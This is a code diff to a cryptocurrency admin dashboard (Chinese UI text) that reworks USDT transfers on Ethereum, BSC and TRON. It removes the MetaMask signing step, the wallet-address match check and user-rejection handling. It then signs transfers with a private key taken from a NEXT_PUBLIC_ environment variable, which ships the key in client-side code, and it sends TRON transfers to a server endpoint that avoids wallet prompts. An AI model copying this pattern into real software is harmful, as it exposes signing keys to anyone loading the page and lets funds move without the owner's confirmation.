@@ -4,13 +4,6 @@ import React, { useState, useEffect } from "react";
 import { useRouter } from "next/navigation";
 import { ethers } from "ethers";
 
-// Add ethers to window for TypeScript
-declare global {
-  interface Window {
-    ethereum?: any;
-  }
-}
-
 interface Project {
   id: string;
   payment_id: string;
@@ -428,38 +421,26 @@ export default function AdminDashboard() {
       return;
     }
 
+    // Validate amount
+    const amount = parseFloat(transferAmount);
+    if (amount <= 0) {
+      setError("转账金额必须大于0");
+      return;
+    }
+
+    if (amount > parseFloat(selectedWallet.usdtBalance)) {
+      setError(`余额不足! 当前余额: ${selectedWallet.usdtBalance} USDT`);
+      return;
+    }
+
     setIsTransferring(true);
     try {
-      // Check if MetaMask is available
-      if (typeof window.ethereum === "undefined") {
-        setError("请安装 MetaMask 钱包以继续转账");
-        return;
-      }
-
-      // Request account access
-      const accounts = await window.ethereum.request({
-        method: "eth_requestAccounts",
-      });
-      const userAddress = accounts[0];
-
-      // Check if connected wallet matches the selected wallet
-      if (userAddress.toLowerCase() !== selectedWallet.address.toLowerCase()) {
-        setError("钱包地址不匹配! 请连接正确的钱包地址。");
-        return;
-      }
-
       // USDT Contract addresses for each chain
       const usdtContracts = {
         ethereum: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
         bsc: "0x55d398326f99059fF775485246999027B3197955",
+        tron: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", // USDT on TRON
       };
-
-      // USDT ABI for transfer function
-      const usdtAbi = [
-        "function transfer(address to, uint256 amount) returns (bool)",
-        "function balanceOf(address owner) view returns (uint256)",
-        "function decimals() view returns (uint8)",
-      ];
 
       // Get the correct USDT contract address
       const usdtAddress =
@@ -469,32 +450,15 @@ export default function AdminDashboard() {
         return;
       }
 
-      // Create provider and contract instance
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-      const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
-
-      // Check current balance
-      const balance = await usdtContract.balanceOf(userAddress);
-      const balanceFormatted = ethers.formatUnits(balance, 6);
-      const amountToTransfer = parseFloat(transferAmount);
-
-      if (amountToTransfer > parseFloat(balanceFormatted)) {
-        setError(`余额不足! 当前余额: ${balanceFormatted} USDT`);
-        return;
+      // Handle TRON differently (it uses TronWeb)
+      if (selectedWallet.chain === "tron") {
+        await handleTronTransfer(usdtAddress, amount);
+      } else {
+        // Handle EVM chains (Ethereum, BSC)
+        await handleEVMTransfer(usdtAddress, amount);
       }
 
-      // Convert amount to wei
-      const amountInWei = ethers.parseUnits(transferAmount, 6);
-
-      // Execute transfer
-      const transferTx = await usdtContract.transfer(
-        spenderAddress,
-        amountInWei
-      );
-      const receipt = await transferTx.wait();
-
-      setSuccess(`✅ 转账成功! 交易哈希: ${transferTx.hash}`);
+      setSuccess(`✅ 转账成功!`);
       setTimeout(() => setSuccess(null), 5000);
 
       // Close modal and reset
@@ -506,9 +470,7 @@ export default function AdminDashboard() {
       // Refresh wallet balances
       await fetchRealUsdtBalances();
     } catch (error: any) {
-      if (error.code === 4001) {
-        setError("❌ 用户拒绝了交易");
-      } else if (error.message?.includes("insufficient funds")) {
+      if (error.message?.includes("insufficient funds")) {
         setError("❌ 钱包余额不足，无法支付交易费用");
       } else {
         setError(`❌ 转账失败: ${error.message || "未知错误"}`);
@@ -516,6 +478,81 @@ export default function AdminDashboard() {
       setTimeout(() => setError(null), 5000);
     } finally {
       setIsTransferring(false);
+    }
+  };
+
+  // Handle EVM chain transfers (Ethereum, BSC)
+  const handleEVMTransfer = async (usdtAddress: string, amount: number) => {
+    // USDT ABI for transfer function
+    const usdtAbi = [
+      "function transfer(address to, uint256 amount) returns (bool)",
+      "function balanceOf(address owner) view returns (uint256)",
+      "function decimals() view returns (uint8)",
+    ];
+
+    // Get private key from environment based on chain
+    let privateKey: string;
+    let rpcUrl: string;
+
+    if (selectedWallet?.chain === "ethereum") {
+      privateKey = process.env.NEXT_PUBLIC_PRIVATE_KEY || "";
+      rpcUrl = process.env.NEXT_PUBLIC_ETHEREUM_RPC_URL || "";
+    } else if (selectedWallet?.chain === "bsc") {
+      privateKey = process.env.NEXT_PUBLIC_PRIVATE_KEY || "";
+      rpcUrl = process.env.NEXT_PUBLIC_BSC_RPC_URL || "";
+    } else {
+      throw new Error(`不支持的区块链: ${selectedWallet?.chain}`);
+    }
+
+    if (!privateKey) {
+      throw new Error(`未找到 ${selectedWallet?.chain} 的私钥配置`);
+    }
+
+    if (!rpcUrl) {
+      throw new Error(`未找到 ${selectedWallet?.chain} 的RPC配置`);
+    }
+
+    // Create provider and wallet instance using private key
+    const provider = new ethers.JsonRpcProvider(rpcUrl);
+    const wallet = new ethers.Wallet(privateKey, provider);
+    const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, wallet);
+
+    // Convert amount to wei (USDT has 6 decimals)
+    const amountInWei = ethers.parseUnits(amount.toString(), 6);
+
+    // Execute transfer
+    const transferTx = await usdtContract.transfer(spenderAddress, amountInWei);
+    const receipt = await transferTx.wait();
+
+    setSuccess(`✅ 转账成功! 交易哈希: ${transferTx.hash}`);
+  };
+
+  // Handle TRON transfers
+  const handleTronTransfer = async (usdtAddress: string, amount: number) => {
+    // For now, we'll use an API endpoint for TRON transfers
+    // This avoids browser wallet popups and keeps it server-side
+    try {
+      const response = await fetch("/api/admin/tron-transfer", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          to: spenderAddress,
+          amount: amount,
+          from: selectedWallet?.address,
+        }),
+      });
+
+      if (!response.ok) {
+        const errorData = await response.json();
+        throw new Error(errorData.error || "TRON 转账失败");
+      }
+
+      const result = await response.json();
+      setSuccess(`✅ TRON 转账成功! 交易ID: ${result.txid}`);
+    } catch (error: any) {
+      throw new Error(`TRON 转账错误: ${error.message}`);
     }
   };
 
